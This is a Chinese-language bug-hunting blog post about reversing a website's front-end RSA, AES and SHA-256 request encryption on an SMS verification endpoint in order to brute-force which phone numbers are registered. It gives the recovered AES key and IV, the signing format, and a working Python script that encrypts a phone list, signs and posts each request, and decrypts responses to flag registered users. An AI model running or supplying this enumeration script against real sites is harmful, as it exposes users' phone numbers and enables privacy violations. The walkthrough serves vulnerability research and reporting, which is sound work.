## 前言

> 本文并非密码向，不会对算法过程/代码逻辑进行具体阐述，因为这没有意义，实战的时候肯定是具体问题具体分析，所以了解个大致流程就行。

在挖洞过程中，很容易找到一些登录/忘记密码是手机验证码验证的站，有些站对发送验证码这一环节并未做太多的限制，理论上可以借助这个漏洞进行爆破，从而得出数据库内所有已注册手机号，这也算一种
**信息泄露** 。这种洞十分好挖，对技术要求不高，很适合SRC入门！

如果站点在请求的时候存在前端加密，大概都是常规的AES或RSA(比如以前的京东/B站)。所以写篇文章，整理下思路。

## 寻源

前几天挖洞的时候就看到个发送验证码的

![image-20220316142759029.png](https://image.3001.net/images/20220406/1649231693_624d474d70bfd6c484fda.png!small)

先跑一百个请求，对发包没有做什么限制，说明有门！

![image-20220316143420919.png](https://image.3001.net/images/20220406/1649231694_624d474e1949a9d42db6b.png!small)

但问题来了，请求体是这样的，明显进行了前端加密，要想爆破，还得先找出加密逻辑。

![image-20220316143508522.png](https://image.3001.net/images/20220406/1649231694_624d474ec193aabbdac3c.png!small)

打开F12,发现控制台在输出东西，

![image-20220316191222919.png](https://image.3001.net/images/20220406/1649231695_624d474fa3b559a32c866.png!small)

再看资源文件，chunk文件加上index，那直接去找index.js文件即可。

![image-20220316191309292.png](https://image.3001.net/images/20220406/1649231696_624d47503012911370493.png!small)

然后就是要找到具体位置了， **c0ny1**
表哥给出了一些好办法，详情见[快速定位前端加密方法](https://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/)

可惜在这个站上不怎么好使，只能慢慢找了。

一般前端加密都是用`JSEncrypt`库的，所以可以试试搜一些`jsencrypt`相关的方法名，如`setPublicKey`、`encrypt`等

若压缩过的代码看得太累，可以试试用<http://jsnice.org/>美化下。

 **不要手撕js，会变得不幸。**

首先打开F12,点开源代码，点个js文件，之后再点下左下角的美化按钮

![image-20220316192636305.png](https://image.3001.net/images/20220406/1649231696_624d475096a41dbfbb0b9.png!small)

代码就变得好看多了

![image-20220316192721656.png](https://image.3001.net/images/20220406/1649231697_624d4751229de8b0889eb.png!small)

尝试性的搜了下`encrypt`，位置大概就被我找到了。

![image-20220316193020888.png](https://image.3001.net/images/20220406/1649231697_624d4751b50802a1f6292.png!small)

这里有很多个函数，如`encodeRSA`、`decodeRSA`、`getKeyRSADefault`、`encodeAES`、`decodeAES`、`getKeyAES`、`signature`这种函数名，可以说是再明显不过的提示了。

## 分析

经过不眠不休的折磨，我逐渐理解了一切。

### 0.DEMO

先了解一下`JSEncrypt`库，十分简单

    
    
    import JSEncrypt from 'jsencrypt'  
    ​  
    //加密  
    var encryptor = new JSEncrypt()  
    var pubKey = '-----BEGIN PUBLIC KEY-----公钥-----END PUBLIC KEY-----'  
    encryptor.setPublicKey(pubKey)//设置公钥  
    var rsaPassWord = encryptor.encrypt('要加密的内容')  
    ​  
    //解密  
    var decrypt = new JSEncrypt()  
    var priKey  = '-----BEGIN RSA PRIVATE KEY-----私钥-----END RSA PRIVATE KEY----'  
    decrypt.setPrivateKey(priKey)//设置秘钥  
    var uncrypted = decrypt.decrypt("要解密的内容")//解密之前拿公钥加密的内容

### 1.RSA

首先在疑似RSA加密的位置的 **结尾** 下个断点，

![image-20220316193942854.png](https://image.3001.net/images/20220406/1649231698_624d47524880b7621592f.png!small)

为什么要在结尾？大概思路是：不去关心这个函数的具体逻辑，因为太费劲；由结果推过程，直接看代码运行结束后那些参数以及返回值，以此结合 **所学知识/经验**
去推断这个函数的作用。

 **我们不是来做密码题的，我们只是来挖洞的。**

然后会发现，右边有一大堆参数。

![image-20220316194411297.png](https://image.3001.net/images/20220406/1649231698_624d4752cc610d121c13b.png!small)

好，再看`encodeRSA`函数，已知n为0，该函数有用的部分就变成这样了

![image-20220316195043527.png](https://image.3001.net/images/20220406/1649231699_624d47535300e6e09d4d8.png!small)

而`s["JSEncrypt"]`很明显，是`JSEncrypt`库的`JSEncrypt`对象,那将代码整理一下就是：

    
    
    function() {  
      o = new JSEncrypt();  
      o.setPublicKey(a);  
      return o.encrypt(t)  
    }

看，其实就是普通的RSA加密！

而且 **RSA公钥** 也给了，就是参数`a`！

![image-20220316213818326.png](https://image.3001.net/images/20220406/1649231699_624d4753d1e98fc8eee41.png!small)

然后加密字符串参数`t`，其值为`PHVDHENXNREOEVON`。这个值是网页在加载的时候就执行`getKeyAES`函数得出的结果。

![image-20220316001641218.png](https://image.3001.net/images/20220406/1649231700_624d47544d0a4baad84c0.png!small)

在F12的控制台中执行一下，能够输出相似的结果。

![image-20220316213619779.png](https://image.3001.net/images/20220406/1649231700_624d4754c2f0b6e316e49.png!small)

`JSEncrypt`的默认RSA加密机制是 **RSAES-PKCS1-V1_5** ，而且还会进行base64编码。

![image-20220316214735598.png](https://image.3001.net/images/20220406/1649231701_624d47557a162211fd16f.png!small)

扔到`CyberChef`先放着，待会有用。

![image-20220316213941415.png](https://image.3001.net/images/20220406/1649231702_624d475628a3e42134a5a.png!small)

加密完了，该尝试解密了。解密需要私钥。一般前端加密，公钥都会直接放到JS里，如果需要解密，那私钥也可能放这。

随便看了下，公钥和私钥就在下面，比较了下这个公钥和之前断点跑出的公钥也对的上。

![image-20220316215057485.png](https://image.3001.net/images/20220406/1649231702_624d4756c5fcb9aff0536.png!small)

这样，就可以解密了。

![image-20220316215159937.png](https://image.3001.net/images/20220406/1649231703_624d4757520924bd43352.png!small)

### 2.AES

接下来就是AES，同样的，下个断点看结果。

![image-20220316215523284.png](https://image.3001.net/images/20220406/1649231704_624d4758081bc25cb99bc.png!small)

能够发现，参数`e`是输入的值，参数`t`的值和之前那个值一模一样,同时也是需要加密的字符串。

而且AES相关参数也给出了：

![image-20220316221254884.png](https://image.3001.net/images/20220406/1649231704_624d47589b6a9bfb68c97.png!small)

初始向量：1234567812345678，CBC模式，zeropadding填充。

AES的话，`CyberChef`没有padding相关选项，运算结果末位有所不同，所以用另一个表哥写的工具：<https://github.com/Leon406/ToolsFx>

![image-20220316224350262.png](https://image.3001.net/images/20220406/1649231705_624d475925bed13acd44a.png!small)

解码的话也是一样，毕竟是对称加密。

### 3.SHA-256

> SHA-2，名称来自于安全散列算法2(Secure Hash Algorithm
> 2)的缩写，一种密码散列函数算法标准,属于SHA算法之一，是SHA-1的后继者。其下又可再分为六个不同的算法标准，包括了：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256

这里就是最后的波纹了，也是最复杂的地方。

还是一样的思路，但由于输入的参数不好猜，于是我在同一行加了好多个断点去看参数变化，这是一个非常好滴技巧！如下图所示，每个蓝色三角形就是断点。

在这能发现，这段代码的意思就是将`e`组合起来，键值对加等号且再用逗号相连变成字符串`n`。

![image-20220316133316256.png](https://image.3001.net/images/20220406/1649231705_624d4759c4d431b6b05a6.png!small)

之后又将`字符串n`进行了相关处理，去掉逗号空格啊，加上括号啊，最后输出格式如下：

    
    
    {clientId=P_AIAS_ROS, encodeKey=GqdPQJptPlZctYZ+tEBo0MDTD7TntMDsrN3ATv5SC/WScxyhpYu/WoQsI0u42eDphmlhuHYWA6rPbWlcDYfyrHN8HWrrzHe+X7aiQh9Hnb1iR//I3abF4+Td641b1SeeYdU3aloc3ScaS8+CbVARKiM9g27R8CKk8Dbekb6lMEk=, requestData=Cy8UWBCz0dwJUBQ1u5BJr1jxicrnJ6YnrwchucXDanOVdV8Pp3rn1Uq35FB3pR7I, requestId=1647409240148, secret=test, timestamp=20220316014040}

好，接下来来验证一下

这是返回值`89a6716fb3958c180837569a4a50a093a2bfa0ab6763a3b439a05b78e80d38f9`

![image-20220316135647792.png](https://image.3001.net/images/20220406/1649231706_624d475a7aa3e663a7e4d.png!small)

输出结果对的上，说明没错：

![image-20220316140038651.png](https://image.3001.net/images/20220406/1649231707_624d475b334ee1324d45d.png!small)

看着下图的请求体，最后总结一下。

![image-20220316140842871.png](https://image.3001.net/images/20220406/1649231707_624d475bda54463fdf766.png!small)

1.在网页加载的时候先获取一个长度16的`AES KEY`，然后对这个`AES KEY`进行 **RSA** + **Base64**
加密，结果为`encodeKey`，

2.将`{"phone":"13888888888","smsCode":""}`这个格式的字符串，根据`AES KEY`进行 **AES** +
**Base64** 加密，结果为`requestData`

3.`clientId`、`requestId`、`timestamp`不影响。这三个参数并未参与密码运算，可以任意更改。

4.将所有参数融合进行 **SHA256** 加密来签名。

## 爆破

分析完毕，那么接下来就可以开始爆破了。

接下来有两种做法：

1.写Python代码。因为思路以及理清且加密逻辑简单，可以直接手搓。

2.写JavaScript代码，配合 **c0ny1** 表哥的插件<https://github.com/c0ny1/jsEncrypter>。

在这里我选择1，具体代码如下：

    
    
    import hashlib  
    import urllib3  
    import requests  
    import base64  
    from Crypto.Cipher import AES  
    ​  
    urllib3.disable_warnings()  
    ​  
    # aes的key和初始向量  
    key = 'PHVDHENXNREOEVON'  
    vi = '1234567812345678'  
    url = ""  
    headers = {"Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",  
             "Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=UTF-8",  
             "Sec-Ch-Ua-Mobile": "?0",  
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",  
             "Token": "undefined", "Sec-Ch-Ua-Platform": "\"Windows\"",  
             "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",  
             "Accept-Encoding": "gzip, deflate",  
             "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}  
    ​  
    ​  
    def AES_Encrypt(data):  
      global key  
      global vi  
      pad = lambda s: s + (16 - len(s) % 16) * chr(0)  
      data = pad(data)  
      # 字符串补位  
      cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))  
      encryptedbytes = cipher.encrypt(data.encode('utf8'))  
      # 加密后得到的是bytes类型的数据  
      encodestrs = base64.b64encode(encryptedbytes)  
      # 使用Base64进行编码,返回byte字符串  
      enctext = encodestrs.decode('utf8')  
      # 对byte字符串按utf-8进行解码  
      return enctext  
    ​  
    ​  
    def AES_Decrypt(data):  
      global key  
      global vi  
      data = data.encode('utf8')  
      encodebytes = base64.decodebytes(data)  
      # 将加密数据转换位bytes类型数据  
      cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, vi.encode('utf8'))  
      text_decrypted = cipher.decrypt(encodebytes)  
      text_decrypted = text_decrypted.rstrip(b'\0')  
      # 去补位  
      text_decrypted = text_decrypted.decode('utf8')  
      return text_decrypted  
    ​  
    ​  
    def sha256(text):  
      return hashlib.sha256(text.encode()).hexdigest()  
    ​  
    ​  
    phone_list = []  
    with open('test-phone.txt', 'r', encoding='utf8') as f:  
      for i in f:  
          phone_list.append(i.strip())  
    ​  
    for i in phone_list:  
      requestsData = AES_Encrypt('{"phone":"%s","smsCode":""}' % i)  
      encodeKey = "lFd5OEc6BEDbh/KA/JiYNOG1xoQY3GgwS8HAjWAVUt19zxXEzjvtice8EZapgHY0HqyEUaZT6lLFTXHfmJ0qXLyPLVzf01yQ0UMIWYQOHPyDygm4JXW/7OBO1dpb3uTjo0MF0YO0U3+LF+LfNHvbqByeXgj1vmswlrNSQMmRgmw="  
      sign_exp = '{clientId=1, encodeKey=%s, requestData=%s, requestId=1, secret=test, timestamp=1}' % (  
          encodeKey, requestsData)  
      sign = sha256(sign_exp)  
      json = {"clientId": "1",  
              "encodeKey": encodeKey,  
              "requestData": requestsData, "requestId": "1",  
              "sign": sign, "timestamp": "1"}  
      res = requests.post(url, headers=headers, json=json, verify=False)  
      try:  
          result = AES_Decrypt(res.text.strip())  
          if '该手机号未查询到用户' in result:  
              print("未注册" + i)  
          else:  
              print("查询到了：" + i)  
      except Exception as e:  
          print(e)  
          print(res.text)  
          exit()

代码中我保持`encodeKey`不变，这样意味着`AES KEY`不变，爆破代码就可以不用写RSA相关了。

因为返回的值长这样，也是一个AES加密，所以写了个`AES_Decrypt`函数用于解密返回包。

![image-20220316232124176.png](https://image.3001.net/images/20220406/1649231708_624d475c8911fd55a13f0.png!small)

![image-20220316232136887.png](https://image.3001.net/images/20220406/1649231709_624d475d54b4dfe47f89d.png!small)

这种爆破手机号的洞我也尝试去投了两个到CNVD，一个归档一个驳回，打个信息泄露擦边球着实难以界定。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

 **多网安工具及学习资料，扫码免费领：**

![](https://image.3001.net/images/20220317/1647478289_623286111c17724d46756.png!small)

